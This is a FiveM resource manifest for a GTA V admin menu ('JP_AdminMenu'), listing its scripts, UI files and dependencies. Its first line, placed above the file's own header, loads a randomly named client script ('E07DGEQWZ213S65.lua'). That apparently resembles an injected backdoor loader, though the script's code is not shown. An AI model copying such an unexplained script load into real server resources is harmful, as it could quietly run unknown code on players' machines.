client_script "E07DGEQWZ213S65.lua"
----------------------- [ JP_AdminMenu ] -----------------------
-- GitHub: https://github.com/juanp15
-- License:
-- url
-- Author: Juanp
-- Name: JP_AdminMenu
-- Version: 1.0.0
-- Description: JP Admin Menu
----------------------- [ JP_AdminMenu ] -----------------------

fx_version  'cerulean'
lua54 'yes'
games       { 'gta5' }

author      'Juanp'
description 'JP Admin Menu'
version     '1.0.0'

ui_page 'html/index.html'
locale      'en'

client_scripts {
  'Config/Config_JP.lua',
  'Utils/Utils_C.lua',
  'Client/*.lua',
  '@menuv/menuv.lua',
  'Menu/JP-AdminMenu.lua',

}

server_scripts {
  'Config/Config_JP.lua',
  '@NRMySQL/lib/MySQL.lua',
  'Utils/Utils_S.lua',
  'Server/*.lua'
}

shared_scripts {
  '@NR_lib/init.lua',
  'Locales/common.lua',
  'Locales/*.locale.lua'
}

files { -- Credits to https://github.com/LVRP-BEN/bl_coords for clipboard copy method
    'html/index.html',
    'html/index.js'
}

dependencies {
  'menuv'
}